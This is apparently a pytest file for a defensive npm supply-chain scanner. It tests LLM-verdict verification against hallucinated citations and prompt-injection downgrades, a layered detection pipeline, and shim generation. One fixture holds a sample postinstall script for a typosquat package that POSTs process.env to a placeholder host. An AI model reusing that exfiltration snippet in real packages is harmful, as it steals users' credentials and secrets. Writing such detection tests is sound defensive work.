"""End-to-end tests for deterministic claim verification, 4-layer pipeline, and shim generation."""

import json
from pathlib import Path

from cli_guard.config import Settings
from cli_guard.core.advisories import AdvisoryClient
from cli_guard.core.cache import VerdictCache
from cli_guard.core.pipeline import SecurityPipeline
from cli_guard.core.verifier import verify_llm_verdict
from cli_guard.ecosystems.base import EcosystemAdapter, InMemoryArchive
from cli_guard.ecosystems.npm.ast_scanner import scan_npm_archive
from cli_guard.ecosystems.npm.resolver import parse_npm_spec
from cli_guard.ecosystems.npm.shims import (
    build_guarded_env,
    install_shims,
    render_posix_shim,
    render_windows_cmd_shim,
)
from cli_guard.llm.base import ChatMessage, LLMProvider, LLMResponse, ToolCall, ToolSpec
from cli_guard.models import (
    Citation,
    LLMVerdict,
    PackageMetadata,
    PackageSpec,
    StaticAnalysisReport,
    VerdictLabel,
)


class FakeAdapter(EcosystemAdapter):
    ecosystem_name = "npm"

    def __init__(self, meta: PackageMetadata, archive: InMemoryArchive) -> None:
        self._meta = meta
        self._archive = archive

    def parse_spec(self, raw: str, *, is_exec_target: bool = False) -> PackageSpec:
        return parse_npm_spec(raw, is_exec_target=is_exec_target)

    def fetch_metadata(self, spec: PackageSpec) -> PackageMetadata:
        return self._meta

    def download_archive(self, metadata: PackageMetadata) -> InMemoryArchive:
        return self._archive

    def scan_archive(self, metadata: PackageMetadata, archive: InMemoryArchive, *, is_exec_target: bool = False):
        return scan_npm_archive(metadata, archive, is_exec_target=is_exec_target)

    def compute_version_diff(self, metadata, current_archive, current_caps):
        return None

    def detect_typosquat(self, name: str) -> list[str]:
        return ["lodash"] if name == "lodahs" else []

    def detect_phantom_and_external_deps(self, metadata: PackageMetadata):
        return ([], [])


class MockMetaProvider(LLMProvider):
    name = "meta"

    def __init__(self, triage_verdict: str = "suspicious", inv_verdict: str = "malicious") -> None:
        self.triage_verdict = triage_verdict
        self.inv_verdict = inv_verdict
        self.calls: list[str] = []

    def chat(
        self,
        messages: list[ChatMessage],
        *,
        model: str,
        tools: list[ToolSpec] | None = None,
        json_mode: bool = False,
        max_tokens: int = 512,
        temperature: float = 0.0,
    ) -> LLMResponse:
        if tools is None:
            self.calls.append("triage")
            return LLMResponse(
                content=json.dumps(
                    {
                        "verdict": self.triage_verdict,
                        "confidence": 0.65,
                        "summary": "Suspicious install script reads process.env and posts externally.",
                        "claims_install_execution": True,
                        "attack_categories": ["exfiltration"],
                        "citations": [
                            {"file": "install.js", "start_line": 1, "end_line": 3, "reason": "exfil"}
                        ],
                    }
                ),
                model=model,
            )

        # Multi-turn investigator: turn 1 reads file, turn 2 submits verdict
        has_tool_result = any(m.role == "tool" for m in messages)
        if not has_tool_result:
            self.calls.append("investigator_read")
            return LLMResponse(
                tool_calls=[
                    ToolCall(
                        id="tc_1",
                        name="read_lines",
                        arguments={"file": "install.js", "start_line": 1, "end_line": 10},
                    )
                ],
                model=model,
            )
        self.calls.append("investigator_submit")
        return LLMResponse(
            tool_calls=[
                ToolCall(
                    id="tc_2",
                    name="submit_verdict",
                    arguments={
                        "verdict": self.inv_verdict,
                        "confidence": 0.96,
                        "summary": "Confirmed install-time environment exfiltration to external host.",
                        "claims_install_execution": True,
                        "attack_categories": ["credential_theft", "exfiltration"],
                        "citations": [
                            {
                                "file": "install.js",
                                "start_line": 1,
                                "end_line": 2,
                                "reason": "Posts process.env to attacker server",
                            }
                        ],
                    },
                )
            ],
            model=model,
        )


class OfflineAdvisoryClient(AdvisoryClient):
    def query_batch(self, packages):
        return {p: [] for p in packages}


def test_verifier_rejects_hallucinated_citations_and_blocks_prompt_injection_downgrade() -> None:
    meta = PackageMetadata(name="bad", version="1.0.0")
    static_rep = StaticAnalysisReport(
        metadata=meta,
        risk_score=70,
        deterministic_floor_suspicious=True,
    )
    # Hallucinated citation on malicious verdict -> downgraded to suspicious
    v1 = LLMVerdict(
        verdict=VerdictLabel.MALICIOUS,
        confidence=0.9,
        citations=[Citation(file="ghost.js", start_line=1, end_line=2, reason="fake")],
    )
    res1 = verify_llm_verdict(v1, static_rep, {"index.js": 10})
    assert len(res1.invalid_citations) == 1
    assert res1.overridden_verdict == VerdictLabel.SUSPICIOUS

    # Prompt-injection coerced `benign` verdict -> clamped back to suspicious
    v2 = LLMVerdict(verdict=VerdictLabel.BENIGN, confidence=0.99, citations=[])
    res2 = verify_llm_verdict(v2, static_rep, {"index.js": 10})
    assert res2.overridden_verdict == VerdictLabel.SUSPICIOUS


def test_full_4_layer_pipeline_benign_fast_path_and_malicious_escalation(tmp_path: Path) -> None:
    settings = Settings(data_dir=tmp_path, cooldown_hours=24.0)
    cache = VerdictCache(settings.cache_db_path)
    advisories = OfflineAdvisoryClient(cache=cache)
    provider = MockMetaProvider()

    # 1. Clean package should exit at Layer 1 with 0 LLM calls and cache hit on 2nd run
    clean_meta = PackageMetadata(
        name="clean-math",
        version="2.0.0",
        integrity="sha512-clean",
        age_hours=500.0,
        has_provenance=True,
    )
    clean_arch = InMemoryArchive(
        text_files={"package.json": '{"name":"clean-math"}', "index.js": "export const x = 1;\n"},
        file_sizes={"package.json": 21, "index.js": 20},
    )
    clean_pipe = SecurityPipeline(
        settings=settings,
        adapter=FakeAdapter(clean_meta, clean_arch),
        cache=cache,
        advisories=advisories,
        llm_provider=provider,
    )
    r_clean = clean_pipe.evaluate(parse_npm_spec("clean-math@2.0.0"))
    assert r_clean.verdict == VerdictLabel.BENIGN
    assert provider.calls == []
    r_cached = clean_pipe.evaluate(parse_npm_spec("clean-math@2.0.0"))
    assert r_cached.from_cache is True

    # 2. Malicious package escalates Layer 1 -> Layer 2 Triage -> Layer 3 Investigator + Verifier
    evil_meta = PackageMetadata(
        name="lodahs",
        version="1.0.0",
        integrity="sha512-evil",
        age_hours=1.5,
        scripts={"postinstall": "node install.js"},
    )
    evil_js = "const e = JSON.stringify(process.env);\nfetch('https://bad.invalid', { method: 'POST', body: e });\n"
    evil_arch = InMemoryArchive(
        text_files={
            "package.json": '{"name":"lodahs","scripts":{"postinstall":"node install.js"}}',
            "install.js": evil_js,
        },
        file_sizes={"package.json": 62, "install.js": len(evil_js)},
    )
    evil_pipe = SecurityPipeline(
        settings=settings,
        adapter=FakeAdapter(evil_meta, evil_arch),
        cache=cache,
        advisories=advisories,
        llm_provider=provider,
    )
    r_evil = evil_pipe.evaluate(parse_npm_spec("lodahs@1.0.0"))
    assert r_evil.verdict == VerdictLabel.MALICIOUS
    assert "layer2_triage_llm" in r_evil.layers_run
    assert "layer3_investigator" in r_evil.layers_run
    assert provider.calls == ["triage", "investigator_read", "investigator_submit"]
    assert r_evil.verification is not None
    assert len(r_evil.verification.valid_citations) == 1


def test_shims_generation_windows_and_posix(tmp_path: Path) -> None:
    win_dir = tmp_path / "win_shims"
    win_written = install_shims(
        win_dir,
        python_exe=Path("C:/Python313/python.exe"),
        platform_name="nt",
    )
    assert set(win_written.keys()) == {"npm", "npx", "pnpm", "yarn", "bun", "bunx"}
    npm_cmd = win_written["npm"].read_text(encoding="utf-8")
    assert "guard intercept npm -- %*" in npm_cmd
    assert render_windows_cmd_shim("pnpm", Path("C:/py.exe")).startswith("@echo off")

    posix_dir = tmp_path / "posix_shims"
    posix_written = install_shims(
        posix_dir,
        python_exe=Path("/usr/bin/python3"),
        platform_name="posix",
    )
    assert "guard intercept yarn -- \"$@\"" in posix_written["yarn"].read_text(encoding="utf-8")
    assert render_posix_shim("bunx", Path("/usr/bin/python3")).startswith("#!/usr/bin/env sh")

    env = build_guarded_env(win_dir, {"PATH": "C:\\Windows"})
    assert env["PATH"].startswith(str(win_dir.resolve()))
    assert env["CG_GUARD_ACTIVE"] == "1"
